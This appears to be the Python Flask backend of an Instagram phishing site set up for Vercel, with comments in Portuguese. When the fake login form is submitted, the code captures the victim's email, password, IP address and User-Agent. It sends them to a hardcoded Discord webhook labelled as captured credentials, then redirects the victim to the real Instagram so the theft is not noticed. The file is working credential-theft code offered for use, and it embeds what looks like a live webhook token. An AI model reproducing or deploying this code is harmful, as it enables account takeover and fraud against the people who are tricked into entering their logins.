import os
from flask import Flask, request, render_template, redirect, send_from_directory
import requests

# Corrige caminhos absolutos para Vercel (templates e static fora da pasta /api)
base_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
app = Flask(
    __name__,
    static_folder=os.path.join(base_dir, "static"),
    template_folder=os.path.join(base_dir, "templates")
)

# ✅ Webhook ativo
WEBHOOK = "https://discord.com/api/webhooks/1356844204608721017/GB-N9jMt__CmHGiFaJUAOg_doQBZTNH0GjOoTwekMa_SBmIff-NKyk91FUDDQuhfCQE2"

@app.route("/img/<path:filename>")
def serve_img(filename):
    return send_from_directory(os.path.join(base_dir, "img"), filename)

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")
        ip = request.headers.get("x-forwarded-for", request.remote_addr)
        user_agent = request.headers.get("User-Agent")

        data = {
            "username": "Instagram Clone Logger",
            "embeds": [
                {
                    "title": "Credenciais capturadas",
                    "color": 0x00FFFF,
                    "fields": [
                        {"name": "Email/Login", "value": email, "inline": True},
                        {"name": "Senha", "value": password, "inline": True},
                        {"name": "IP", "value": ip, "inline": False},
                        {"name": "User-Agent", "value": user_agent, "inline": False}
                    ]
                }
            ]
        }

        try:
            r = requests.post(WEBHOOK, json=data)
            print("[+] Webhook enviado:", r.status_code)
        except Exception as e:
            print("[!] Erro ao enviar webhook:", e)

        return redirect("https://www.instagram.com")

    return render_template("index.html")

# ✅ Obrigatório para Vercel
handler = app
